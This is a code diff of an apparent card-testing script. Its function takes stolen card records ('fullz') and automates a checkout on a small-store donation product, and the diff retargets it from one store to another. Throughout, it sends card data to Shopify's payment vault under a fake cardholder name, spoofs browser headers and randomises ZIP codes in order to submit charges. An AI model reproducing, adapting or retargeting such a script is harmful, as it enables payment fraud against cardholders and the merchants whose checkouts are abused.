@@ -29,15 +29,15 @@ async def create_shopify_charge(fullz, session):
         zip = str(random.randint(10021, 10030))
 
 
-        url="https://philocracy.co/cart/add.js"
+        url="https://bold3.org/cart/add.js"
 
         headers = {
-            'authority': 'philocracy.co',
+            'authority': 'bold3.org',
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://philocracy.co',
-            'referer': 'https://philocracy.co/products/20-donation',
+            'origin': 'https://bold3.org',
+            'referer': 'https://bold3.org/products/25-donation',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
@@ -48,8 +48,8 @@ async def create_shopify_charge(fullz, session):
         data = {
             'form_type': 'product',
             'utf8': '✓',
-            'id': '40986521108660',
-            'product-id': '6977889960116',
+            'id': '12240744611932',
+            'product-id': '1332361068636',
             'section-id': 'product-template',
         }
 
@@ -60,17 +60,17 @@ async def create_shopify_charge(fullz, session):
         await asyncio.sleep(0.5)
 
         headers = {
-            'authority': 'philocracy.co',
+            'authority': 'bold3.org',
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://philocracy.co/products/20-donation',
+            'referer': 'https://bold3.org/products/25-donation',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
             'user-agent': user_agent,
         }
 
-        response = await session.get('https://philocracy.co/cart.js', headers=headers)
+        response = await session.get('https://bold3.org/cart.js', headers=headers)
         await asyncio.sleep(0.5)
         try:
             token = response.json()["token"]
@@ -84,11 +84,11 @@ async def create_shopify_charge(fullz, session):
 
 
         headers = {
-            'authority': 'philocracy.co',
+            'authority': 'bold3.org',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            'referer': 'https://philocracy.co/cart',
+            'referer': 'https://bold3.org/cart',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
@@ -98,7 +98,7 @@ async def create_shopify_charge(fullz, session):
         }
 
         response = await session.get(
-            f'https://philocracy.co/checkouts/cn/{token}',
+            f'https://bold3.org/checkouts/cn/{token}',
             headers=headers,
         )
 
@@ -151,7 +151,7 @@ async def create_shopify_charge(fullz, session):
                 'issue_number': '',
                 'name': 'TONMOY KID',
             },
-            'payment_session_scope': 'philocracy.co',
+            'payment_session_scope': 'bold3.org',
         }
 
         response = await session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data)
@@ -174,12 +174,12 @@ async def create_shopify_charge(fullz, session):
 
 
         headers = {
-            'authority': 'philocracy.co',
+            'authority': 'bold3.org',
             'accept': 'application/json',
             'accept-language': 'en-US',
             'content-type': 'application/json',
-            'origin': 'https://philocracy.co',
-            'referer': 'https://philocracy.co/',
+            'origin': 'https://bold3.org',
+            'referer': 'https://bold3.org/',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
@@ -384,14 +384,14 @@ async def create_shopify_charge(fullz, session):
                 'attemptToken': f'{token}-0.45270720273653375',
                 'metafields': [],
                 'analytics': {
-                    'requestUrl': f'https://philocracy.co/checkouts/cn/{token}/',
+                    'requestUrl': f'https://bold3.org/checkouts/cn/{token}/',
                     'pageId': 'ef35e54a-4A59-42F9-2BFA-9C891066EF9B',
                 },
             },
             'operationName': 'SubmitForCompletion',
         }
 
-        response = await session.post('https://philocracy.co/checkouts/unstable/graphql', headers=headers, json=json_data)
+        response = await session.post('https://bold3.org/checkouts/unstable/graphql', headers=headers, json=json_data)
                 
         
         
@@ -424,15 +424,15 @@ async def create_shopify_charge(fullz, session):
 
 
 
-        url = 'https://philocracy.co/checkouts/unstable/graphql'
+        url = 'https://bold3.org/checkouts/unstable/graphql'
         headers = {
-            'authority': 'philocracy.co',
+            'authority': 'bold3.org',
             'accept': 'application/json',
             'accept-language': 'en-US',
             'content-type': 'application/json',
             'dnt': '1',
-            'origin': 'https://philocracy.co',
-            'referer': 'https://philocracy.co/',
+            'origin': 'https://bold3.org',
+            'referer': 'https://bold3.org/',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
@@ -457,15 +457,15 @@ async def create_shopify_charge(fullz, session):
         
         await asyncio.sleep(5)
 
-        url = 'https://philocracy.co/checkouts/unstable/graphql'
+        url = 'https://bold3.org/checkouts/unstable/graphql'
         headers = {
-            'authority': 'philocracy.co',
+            'authority': 'bold3.org',
             'accept': 'application/json',
             'accept-language': 'en-US',
             'content-type': 'application/json',
             'dnt': '1',
-            'origin': 'https://philocracy.co',
-            'referer': 'https://philocracy.co/',
+            'origin': 'https://bold3.org',
+            'referer': 'https://bold3.org/',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
